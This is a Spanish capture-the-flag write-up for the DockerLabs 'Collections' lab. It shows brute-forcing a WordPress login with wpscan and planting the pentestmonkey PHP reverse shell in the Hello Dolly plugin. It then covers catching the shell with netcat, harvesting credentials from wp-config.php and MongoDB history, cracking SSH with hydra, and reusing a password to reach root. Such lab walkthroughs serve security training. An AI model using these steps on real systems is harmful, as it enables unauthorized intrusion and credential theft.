---
title: DockerLabs - Collections
summary: "Write-up del laboratorio Collections de DockerLabs"
author: elcybercurioso
date: 2025-11-25
categories: [Post, DockerLabs]
tags: [medio, wordpress, rce, brute force, weak credentials, credentials leaking, ssh, mongodb, ]
media_subpath: "/assets/img/posts/dockerlabs_collections"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
27017/tcp open  mongod
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ nmap -sCV -p22,80,27017 172.17.0.2                          
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 25:3f:a6:b3:1b:a8:dc:e6:ef:0a:51:a7:d6:f4:15:c9 (ECDSA)
|_  256 d1:38:83:b2:33:0d:ad:b6:44:4f:b5:6e:fb:17:08:9f (ED25519)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
27017/tcp open  mongodb MongoDB 7.0.9 6.1 or later
| mongodb-databases: 
|   codeName = UnsupportedOpQueryCommand
|   errmsg = Unsupported OP_QUERY command: listDatabases. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|   code = 352
|_  ok = 0.0
| mongodb-info: 
|   MongoDB Build info
|     bits = 64
|     gitVersion = 3ff3a3925c36ed277cf5eafca5495f2e3728dd67
|     versionArray
|       0 = 7
|       1 = 0
|       2 = 9
|       3 = 0
|     maxBsonObjectSize = 16777216
|     allocator = tcmalloc
|     ok = 1.0
|     version = 7.0.9
|     buildEnvironment
|       target_arch = x86_64
|       ccflags = -Werror -include mongo/platform/basic.h -ffp-contract=off -fasynchronous-unwind-tables -g2 -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -gdwarf-5 -fno-omit-frame-pointer -fno-strict-aliasing -O2 -march=sandybridge -mtune=generic -mprefer-vector-width=128 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-const-variable -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -gdwarf64 -Wa,--nocompress-debug-sections -fno-builtin-memcmp -Wimplicit-fallthrough=5
|       cxx = /opt/mongodbtoolchain/v4/bin/g++: g++ (GCC) 11.3.0
|       target_os = linux
|       cppdefines = SAFEINT_USE_INTRINSICS 0 PCRE2_STATIC NDEBUG _XOPEN_SOURCE 700 _GNU_SOURCE _FORTIFY_SOURCE 2 ABSL_FORCE_ALIGNED_ACCESS BOOST_ENABLE_ASSERT_DEBUG_HANDLER BOOST_FILESYSTEM_NO_CXX20_ATOMIC_REF BOOST_LOG_NO_SHORTHAND_NAMES BOOST_LOG_USE_NATIVE_SYSLOG BOOST_LOG_WITHOUT_THREAD_ATTR BOOST_MATH_NO_LONG_DOUBLE_MATH_FUNCTIONS BOOST_SYSTEM_NO_DEPRECATED BOOST_THREAD_USES_DATETIME BOOST_THREAD_VERSION 5
|       distarch = x86_64
|       cxxflags = -Woverloaded-virtual -Wpessimizing-move -Wno-maybe-uninitialized -fsized-deallocation -Wno-deprecated -std=c++20
|       cc = /opt/mongodbtoolchain/v4/bin/gcc: gcc (GCC) 11.3.0
|       distmod = ubuntu2204
|       linkflags = -Wl,--fatal-warnings -B/opt/mongodbtoolchain/v4/bin -gdwarf-5 -pthread -Wl,-z,now -fuse-ld=lld -fstack-protector-strong -gdwarf64 -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro -Wl,--compress-debug-sections=none -Wl,-z,origin -Wl,--enable-new-dtags
|     openssl
|       compiled = OpenSSL 3.0.2 15 Mar 2022
|       running = OpenSSL 3.0.2 15 Mar 2022
|     debug = false
|     storageEngines
|       0 = devnull
|       1 = wiredTiger
|     modules
|     sysInfo = deprecated
|     javascriptEngine = mozjs
|   Server status
|     codeName = UnsupportedOpQueryCommand
|     errmsg = Unsupported OP_QUERY command: serverStatus. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|     code = 352
|_    ok = 0.0
```

## análisis

Comenzamos revisando los recursos existentes del servidor web con **gobuster**:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 200) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/wordpress            (Status: 301) [Size: 312]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que existe un WordPress desplegado, por lo que accedemos, pero vemos que se está empleando virtual hosting:

![Desktop View](/20251117195427.webp){: width="972" height="589" .shadow}

Para que se resuelvan las URLs correctamente, procedemos a modificar nuestro fichero `/etc/hosts`, indicando una línea con la IP y el virtual host:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ cat /etc/hosts                                                    
...
172.17.0.2      collections.dl
...
```

Una vez hecho el cambio, recargamos la página principal del WordPress, y vemos que ahora todo carga correctamente:

![Desktop View](/20251117195637.webp){: width="972" height="589" .shadow}

Tras echarle un vistazo a la página, vemos que un posible usuario sería `chocolate`:

![Desktop View](/20251117200024.webp){: width="972" height="589" .shadow}

## acceso inicial (chocolate)

### RCE + movimiento lateral (www-data -> chocolate)

Obtenemos la contraseña de acceso al panel de administración de WordPress por fuerza bruta empleando **wpscan**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ wpscan --url http://collections.dl/wordpress -U chocolate -P /usr/share/seclists/Passwords/rockyou.txt -t 32
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | `_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - chocolate / c********                                                                                                                                                                                 
Trying chocolate / michelle Time: 00:00:00 <                                                                                                                               > (32 / 14344424)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: chocolate, Password: c********
```

Accedemos con las credenciales obtenidas:

![Desktop View](/20251117211152.webp){: width="972" height="589" .shadow}

Vemos que efectivamente las credenciales son correctas:

![Desktop View](/20251117211227.webp){: width="972" height="589" .shadow}

Revisamos los plugins instalados, y encontramos que está instalado `Hello Dolly` (plugin conocido por ser vulnerable a ejecución remota de comandos):

![Desktop View](/20251117211313.webp){: width="972" height="589" .shadow}

Para obtener una consola, procedemos a modificar el script `hello.php` con un payload que se encargue de entablar la conexión, como por ejemplo el de [pentestmonkey php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), el cual debemos únicamente modificar la IP y el puerto en el que estamos en escucha (no debemos borrar la funcionalidad por defecto del script, sino indicar el payload que nos devolverá la reverse shell antes del código que ya está definido en el script **hello.php**):

![Desktop View](/20251117222310.webp){: width="972" height="589" .shadow}

La estructura del fichero **hello.php** debería quedar de la siguiente manera:

```php
<?php

<payload de PentestMonkey reverse shell>

<codigo por defecto del fichero hello.php>

?>
```

Una vez guardados los cambios, procedemos a activar el plugin (no activar primero el plugin y luego editar el script, ya que de lo contrario el plugin ya no estará disponible para ser modificado, y habría que reiniciar el laboratorio para obtener la consola de esta manera):

![Desktop View](/20251117214240.webp){: width="972" height="589" .shadow}

Una vez que hayamos activado el plugin, si ya nos habíamos puesto en escucha a la hora de activar el plugin, deberíamos haber recibido la consola correctamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ nc -nlvp 4444                                 
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 47846
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can`t access tty; job control turned off
$ whoami
www-data
$ hostname -I
172.17.0.2
```

Trataremos la consola para poder operar con más facilidad:

```bash
$ script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@1aaf7edd5a74:/$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ stty raw -echo;fg
[1]  + continued  nc -nlvp 4444
                               reset xterm
www-data@1aaf7edd5a74:/$ export TERM=xterm
www-data@1aaf7edd5a74:/$ export SHELL=bsh
www-data@1aaf7edd5a74:/$ export SHELL=bash
www-data@1aaf7edd5a74:/$ stty rows 49 columns 210
```

Revisando los ficheros del sistema, vemos que es posible revisar el contenido del script que contiene la configuración de WordPress, y en la cual hay un comentario con las credenciales del usuario `chocolate`:

```bash
www-data@1aaf7edd5a74:/var/www/html/wordpress$ cat wp-config.php 
<?php

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpressuser' );

/** Database password */
define( 'DB_PASSWORD', 't*******************' );

/** Acceso alternativo chocolate:e******* */

/** Database hostname */
define( 'DB_HOST', 'localhost' );
```

Probamos a loguearnos como el usuario `chocolate`, y vemos que las credenciales son correctas:

```bash
www-data@1aaf7edd5a74:/var/www/html/wordpress$ su chocolate
Password: 
chocolate@1aaf7edd5a74:/var/www/html/wordpress$ whoami
chocolate
```

### SSH (chocolate)

Tratamos de obtener la contraseña de dicho usuario por fuerza bruta empleando **hydra**, y pasado un rato la termina sacando:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ hydra -l chocolate -P /usr/share/seclists/Passwords/rockyou.txt ssh://172.17.0.2 -t 64 -I
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: chocolate   password: e*******
1 of 1 target successfully completed, 1 valid password found
```

Nos conectamos por SSH con las credenciales obtenidas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ ssh chocolate@172.17.0.2                                             
chocolate@172.17.0.2`s password: 
chocolate@f734bfdaf9be:~$ whoami
chocolate
chocolate@f734bfdaf9be:~$ hostname -I
172.17.0.2
```

Listamos los usuarios del sistema a los cuales podemos apuntar para movernos lateralmente o escalar privilegios:

```bash
chocolate@f734bfdaf9be:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
mongodb:x:999:999::/data/db:/bin/sh
dbadmin:x:1000:1000:dbadmin,,,:/home/dbadmin:/bin/bash
chocolate:x:1001:1001:chocolate,,,:/home/chocolate:/bin/bash
```

## obtención de la contraseña (dbadmin)

### método más tedioso

Tratamos de conectarnos al gestor de la base de datos MongoDB por el puerto 27017 de la máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ mongo 172.17.0.2:27017      
MongoDB shell version v7.0.14
connecting to: mongodb://172.17.0.2:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("********-****-****-****-************") }
MongoDB server version: 7.0.9
```

Vemos que podemos acceder correctamente sin tener que aportar credenciales:

```bash
> help
        db.help()                    help on db methods
        db.mycoll.help()             help on collection methods
        sh.help()                    sharding helpers
        rs.help()                    replica set helpers
        help admin                   administrative help
        help connect                 connecting to a db help
        help keys                    key shortcuts
        help misc                    misc things to know
        help mr                      mapreduce

        show dbs                     show database names
        show collections             show collections in current database
        show users                   show users in current database
        show profile                 show most recent system.profile entries with time >= 1ms
        show logs                    show the accessible logger names
        show log [name]              prints out the last segment of log in memory, 'global' is default
        use <db_name>                set current database
        db.mycoll.find()             list objects in collection mycoll
        db.mycoll.find( { a : 1 } )  list objects in mycoll where a == 1
        it                           result of the last line evaluated; use to further iterate
        DBQuery.shellBatchSize = x   set default number of items to display on shell
        exit                         quit the mongo shell
> show dbs
accesos  0.000GB
admin    0.000GB
config   0.000GB
local    0.000GB
> show collections
> show users
> show profile
db.system.profile is empty
Use db.setProfilingLevel(2) will enable profiling
Use db.system.profile.find() to show raw profile entries
> show logs
global
startupWarnings
```

Empleamos la herramienta **mongodump**, la cual se encarga de obtener toda la información disponible del gestor de la base de datos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ mongodump --host 172.17.0.2 --port 27017 --out dump
2025-XX-XXTXX:XX:XX.XXX+0000    writing admin.system.version to dump/admin/system.version.bson
2025-XX-XXTXX:XX:XX.XXX+0000    done dumping admin.system.version (1 document)
2025-XX-XXTXX:XX:XX.XXX+0000    writing accesos.usuarios to dump/accesos/usuarios.bson
2025-XX-XXTXX:XX:XX.XXX+0000    done dumping accesos.usuarios (1 document)
```

Dentro de uno de los ficheros que obtiene, encontramos lo que podemos deducir que se tratan de unas credenciales:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Collections]
└─$ cat dump/accesos/usuarios.bson
T_idfE�Ef�ͮ��nombrdbadmincontraseñac***********************
```

### método más simple

Revisando los ficheros del directorio personal del usuario `chocolate`, encontramos unas credenciales en el historial de MongoDB:

```bash
chocolate@f734bfdaf9be:~$ ls -la .mongodb/mongosh/
total 28
drwx------ 3 chocolate chocolate 4096 May 16  2024 .
drwx------ 3 chocolate chocolate 4096 May 16  2024 ..
-rw------- 1 chocolate chocolate 6354 May 16  2024 6645f1a68a091fae762202d7_log
-rw------- 1 chocolate chocolate  140 May 16  2024 config
-rw------- 1 chocolate chocolate  130 May 16  2024 mongosh_repl_history
drwxrwxr-x 2 chocolate chocolate 4096 May 16  2024 snippets
chocolate@f734bfdaf9be:~$ cat .mongodb/mongosh/mongosh_repl_history 
show dbs
db.fsyncLock()
db.usuarios.insert({"usuario": "dbadmin", "contraseña": "c***********************"})
use accesos
show dbs
```

## movimiento lateral (dbadmin)

Tratamos de movernos lateralmente al usuario `dbadmin`, y vemos que las credenciales que hemos encontrando son correctas:

```bash
chocolate@f734bfdaf9be:~$ su dbadmin
Password: 
dbadmin@f734bfdaf9be:/home/chocolate$ whoami
dbadmin
```

## escalada de privilegios (root)

Probamos a ver si la misma contraseña también es usada por el usuario `root`, y vemos que es el caso:

```bash
www-data@1aaf7edd5a74:/$ su root
Password: 
root@1aaf7edd5a74:/# whoami
root
```

Y hasta aquí la resolución de la máquina Collections!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>